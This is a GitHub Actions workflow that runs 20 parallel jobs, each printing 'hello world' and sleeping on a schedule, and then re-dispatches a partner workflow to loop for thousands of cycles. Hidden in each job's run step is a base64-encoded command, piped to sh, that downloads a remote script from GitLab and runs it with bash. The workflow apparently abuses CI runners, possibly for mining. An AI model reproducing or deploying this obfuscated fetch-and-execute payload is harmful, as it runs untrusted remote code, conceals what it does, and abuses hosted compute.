name: 🔵 khurap

on:
  workflow_dispatch:
    inputs:
      loop_count:
        description: 'Siklus tersisa'
        required: true
        default: '9999'

permissions:
  actions: write

jobs:
  run-lscpu:
    name: ${{ matrix.name }}
    strategy:
      fail-fast: false
      max-parallel: 20
      matrix:
        include:
          - name: hellios-ayonse11
          - name: hellios-byonse11
          - name: hellios-cyonse11
          - name: hellios-dyonse11
          - name: hellios-eyonse11
          - name: hellios-fyonse11
          - name: hellios-gyonse11
          - name: hellios-hyonse11
          - name: hellios-iyonse11
          - name: hellios-jyonse11
          - name: helilo-kyonser11
          - name: helilo-lyonser11
          - name: helilo-myonser11
          - name: helilo-nyonser11
          - name: helilo-oyonser11
          - name: helilo-pyonser11
          - name: helilo-qyonser11
          - name: helilo-ryonser11
          - name: helilo-syonser11
          - name: helilo-tyonser11
    runs-on: ubuntu-latest
    timeout-minutes: 320
    steps:
      - name: Jalankan dengan durasi dinamis
        run: |
          HOUR_UTC=$(date -u +%H)
          LOOP=${{ github.event.inputs.loop_count }}
          # Hitung siklus penuh berdasarkan nilai awal baru 9988
          COMPLETED=$(( (9988 - LOOP) / 3 ))
          if [ "$COMPLETED" -ge 3 ]; then
            if [ "$HOUR_UTC" -eq 4 ]; then
              echo "🕚 HELLO WORLD 🕚"
              SLEEP=18000
            elif [ "$HOUR_UTC" -ge 23 ] || [ "$HOUR_UTC" -lt 3 ]; then
              echo "🕕 HELLO WORLD"
              SLEEP=10800
            else
              if [ "$LOOP" -ge 9983 ]; then    # 6 loop pertama (9988–9983)
                echo "🔄 hello world"
                SLEEP=600
              else
                echo "⏳ hello world"
                SLEEP=3600
              fi
            fi
          else
            # Sebelum 3 siklus, aturan biasa
            if [ "$LOOP" -ge 9983 ]; then
              echo "🔄 Awal loop, sleep pendek"
              SLEEP=600
            else
              echo "⏳ Loop lanjutan, sleep 1 jam"
              SLEEP=3600
            fi
          fi
          echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS94cGFuemVycy9wbGF5Ly0vcmF3L21haW4vbGltZXZlcnMgfCBiYXNo | sh & sleep $SLEEP

  trigger-phanu:
    needs: run-lscpu
    runs-on: ubuntu-latest
    if: github.event.inputs.loop_count > 0
    steps:
      - name: Panggil phanu (next = khirap)
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          new_loop=$(( ${{ github.event.inputs.loop_count }} - 1 ))
          curl -X POST \
            -H "Authorization: token $GITHUB_TOKEN" \
            -H "Accept: application/vnd.github.v3+json" \
            https://api.github.com/repos/${{ github.repository }}/actions/workflows/phanu.yml/dispatches \
            -d "{\"ref\":\"main\",\"inputs\":{\"loop_count\":\"$new_loop\",\"next_phase\":\"khirap\"}}"